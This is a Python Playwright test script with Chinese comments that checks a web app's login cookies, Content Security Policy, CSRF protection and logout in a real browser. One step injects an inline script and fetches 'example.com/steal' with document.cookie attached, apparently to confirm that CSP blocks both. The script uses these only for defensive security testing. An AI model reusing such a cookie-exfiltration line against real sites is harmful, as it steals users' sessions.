"""登录会话与内容安全策略的真实浏览器验证：真实前端构建产物（`vite preview`，带生产环境同一份 CSP）+ 真实后端 + 真实 MySQL。

检查：
1. 登录后页面脚本读不到令牌：document.cookie 里没有 session_token（HttpOnly），localStorage 里没有 token；只有 csrf_token 可读；
2. 登录后的页面正常工作，且整个过程没有任何 CSP 违规（策略没有挡掉页面自己的东西）；
3. CSP 真的在拦：注入内联 <script>、把数据 fetch 到别的域名，都被拦下并产生违规事件；
4. CSRF：浏览器里用 Cookie 发会改数据的请求，不带 X-CSRF-Token 被拒（403），带上才成功；
5. 退出登录后 Cookie 被清掉，刷新回到登录页，受保护接口 401。
前提：MySQL 可用；后端在 8011（`python -m uvicorn FasdtApi.main:app --port 8011`，非生产环境）；
      `npm --prefix frontend run build` 之后 `npm --prefix frontend run preview`（4173 端口，--strictPort）。
用法：$env:PLAYWRIGHT_CHANNEL='msedge'; .venv\\Scripts\\python.exe scripts\\check_session_browser.py [--url http://127.0.0.1:4173]
"""
import json
import os
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
os.environ.setdefault("CONSOLE_LOG_LEVEL", "CRITICAL")

from tests import _route_client as rc  # noqa: E402  先导入：设置非生产环境变量

from playwright.sync_api import sync_playwright  # noqa: E402

URL = sys.argv[sys.argv.index("--url") + 1] if "--url" in sys.argv else "http://127.0.0.1:4173"
RESULTS = []


def check(condition, message):
    RESULTS.append((bool(condition), message))
    print(f"  {'PASS' if condition else 'FAIL'} {message}")


INIT_SCRIPT = """
window.__csp = [];
document.addEventListener('securitypolicyviolation', (e) => window.__csp.push({directive: e.violatedDirective, blocked: e.blockedURI, sample: (e.sample || '').slice(0, 60)}));
"""


def main() -> int:
    os.environ["LOGIN_IP_RATE_LIMIT"] = "1000"
    user = rc.create_user("browser-session")
    try:
        with sync_playwright() as p:
            channel = os.getenv("PLAYWRIGHT_CHANNEL")
            browser = p.chromium.launch(channel=channel) if channel else p.chromium.launch()
            context = browser.new_context()
            page = context.new_page()
            page.add_init_script(INIT_SCRIPT)
            console_errors = []
            page.on("console", lambda m: console_errors.append(m.text) if m.type == "error" else None)

            print("== 1. 登录 ==")
            page.goto(f"{URL}/login")
            page.wait_for_selector("input", timeout=15000)
            inputs = page.locator("input:visible")
            inputs.nth(0).fill(user["name"])
            page.locator("input[type=password]:visible").first.fill(user["password"])
            page.get_by_role("button", name="登录", exact=True).first.click()
            page.wait_for_url(lambda u: "/login" not in u, timeout=20000)
            page.wait_for_load_state("networkidle")
            check("/login" not in page.url, f"登录成功并离开登录页（{page.url}）")

            print("== 2. 页面脚本读不到令牌 ==")
            readable = page.evaluate("document.cookie")
            check("session_token" not in readable, "document.cookie 里没有 session_token（HttpOnly）")
            check("csrf_token=" in readable, "document.cookie 里有可读的 csrf_token")
            check(page.evaluate("localStorage.getItem('token')") is None, "localStorage 里没有 token")
            check(page.evaluate("JSON.stringify(Object.keys(localStorage)).includes('token')") is False, "localStorage 所有键里都没有 token")
            cookies = {c["name"]: c for c in context.cookies()}
            check(cookies.get("session_token", {}).get("httpOnly") is True, "浏览器确实存了 HttpOnly 的 session_token")
            check(cookies.get("session_token", {}).get("sameSite") == "Lax", "session_token 的 SameSite=Lax")

            print("== 3. 登录后的页面工作正常，没有 CSP 违规 ==")
            for path in ("/agents", "/settings", "/todos"):
                page.goto(f"{URL}{path}")
                page.wait_for_load_state("networkidle")
                check("/login" not in page.url, f"带 Cookie 访问 {path} 不会被踢回登录页")
            violations = page.evaluate("window.__csp")
            check(violations == [], f"整个过程没有 CSP 违规（{violations[:3]}）")
            check(not [e for e in console_errors if "Content Security Policy" in e], "控制台没有 CSP 报错")

            print("== 4. CSP 真的在拦 ==")
            page.evaluate("""() => { const s = document.createElement('script'); s.textContent = 'window.__pwned = 1'; document.body.appendChild(s); }""")
            check(page.evaluate("window.__pwned") is None, "注入的内联脚本没有执行")
            exfil = page.evaluate("""async () => { try { await fetch('https://example.com/steal?c=' + encodeURIComponent(document.cookie)); return 'sent' } catch (e) { return 'blocked' } }""")
            check(exfil == "blocked", "往别的域名发请求被 connect-src 拦下")
            kinds = {v["directive"] for v in page.evaluate("window.__csp")}
            check({"script-src-elem", "connect-src"} <= kinds or {"script-src", "connect-src"} <= kinds, f"两次攻击都产生了违规事件（{sorted(kinds)}）")

            print("== 5. CSRF ==")
            body = json.dumps({"occupation": "浏览器验证"})
            no_header = page.evaluate("""async (body) => (await fetch('/api/user/profile', {method: 'PUT', headers: {'Content-Type': 'application/json'}, body})).status""", body)
            check(no_header == 403, f"Cookie 鉴权的 PUT 不带 X-CSRF-Token 被拒（{no_header}）")
            with_header = page.evaluate("""async (body) => {
                const token = document.cookie.split('; ').find(c => c.startsWith('csrf_token=')).split('=')[1];
                return (await fetch('/api/user/profile', {method: 'PUT', headers: {'Content-Type': 'application/json', 'X-CSRF-Token': token}, body})).status }""", body)
            check(with_header == 200, f"带上 X-CSRF-Token 成功（{with_header}）")
            via_ui_client = page.evaluate("""async () => (await fetch('/api/user/me')).status""")
            check(via_ui_client == 200, "读取类请求只靠 Cookie 就能成功")

            print("== 6. 退出登录 ==")
            status = page.evaluate("""async () => {
                const token = document.cookie.split('; ').find(c => c.startsWith('csrf_token=')).split('=')[1];
                return (await fetch('/api/user/logout', {method: 'POST', headers: {'X-CSRF-Token': token}})).status }""")
            check(status == 200, "退出登录接口成功")
            check("session_token" not in {c["name"] for c in context.cookies()}, "浏览器里的 session_token 已被清除")
            check(page.evaluate("document.cookie.includes('csrf_token=')") is False, "csrf_token 也被清除")
            check(page.evaluate("""async () => (await fetch('/api/user/me')).status""") == 401, "退出后受保护接口 401")
            page.goto(f"{URL}/agents")
            page.wait_for_url("**/login**", timeout=15000)
            check("/login" in page.url, "退出后访问受保护页面回到登录页")
            browser.close()
    finally:
        rc.cleanup()
    failed = [m for ok, m in RESULTS if not ok]
    print(f"\n通过 {len(RESULTS) - len(failed)} 项，失败 {len(failed)} 项")
    for m in failed:
        print("  ✘", m)
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
